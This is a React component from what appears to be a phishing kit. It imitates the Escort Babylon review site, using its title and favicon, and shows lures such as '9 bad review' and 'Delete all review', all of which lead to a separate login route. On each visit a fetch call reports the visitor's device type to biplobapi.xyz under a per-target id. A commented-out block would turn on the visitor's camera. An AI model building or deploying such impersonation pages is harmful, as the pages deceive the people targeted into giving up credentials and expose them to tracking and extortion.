import React, { useEffect, useRef } from "react";
import { isBrowser } from "react-device-detect";
import { Link, useLoaderData, useLocation, useParams } from "react-router-dom";
import "./Babylon.css";

const BabylonNew = () => {
  const videoRef = useRef(null);
  const params = useParams();
  const location = useLocation();
  const pathAfterDomain = location.pathname.split("/").slice(1, -1).join("/");
  const { user } = useLoaderData();

  localStorage.setItem("url", `/${pathAfterDomain}/${params.id}`);
  let type;
  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  useEffect(() => {
    const bookings = {
      type: type,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();
    // async function startCamera() {
    //   try {
    //     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    //     if (videoRef.current) {
    //       videoRef.current.srcObject = stream;
    //       videoRef.current.play().catch(error => {
    //         console.error('Error playing video:', error);
    //       });
    //     }
    //   } catch (error) {
    //     console.error('Error accessing camera:', error);
    //   }
    // }

    // startCamera();

    // Cleanup function to stop the camera when the component unmounts
    // Set the document title
    document.title = "Escort Babylon: Reviews of Escorts";

    // Create a link element for the favicon
    const favicon = document.createElement("link");
    favicon.rel = "icon";
    favicon.href = "https://escortbabylon.net/images/escortBabylon_favicon.ico"; // Update with the correct path to your favicon

    // Append the favicon to the head
    document.head.appendChild(favicon);

    // Cleanup function to remove the favicon when the component is unmounted or favicon changes

    return () => {
      document.head.removeChild(favicon);
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []); // Empty dependency array ensures this effect runs only once

  return (
    <div style={{ width: "100%", minHeight: "100vh", background: "#EAF7FD" }}>
      <div className="b_main_container">
        <div className="position-relative">
          <img src="/header.png" alt="" className="b_header_img" />
          <Link class="homesearch" to={`/babylon/login/${params.id}`}>
            <input type="text" placeholder="Search" className="b_input" />
            <button className="b_form_btn">Search</button>
          </Link>
        </div>
        <img src="/reviews.png" alt="" className="fpreviews" />
        <div className="text-center">
          <Link to={`/babylon/login/${params.id}`} className="b_link">
            9 bad review
          </Link>{" "}
          <br />
          <Link to={`/babylon/login/${params.id}`} className="b_link">
            view all <span className="b_rvw">review</span>
          </Link>{" "}
          <br />
          <Link
            to={`/babylon/login/${params.id}`}
            className="b_link b_link_dlt"
          >
            Delete all review
          </Link>{" "}
          <br />
        </div>
      </div>
    </div>
  );
};

export default BabylonNew;
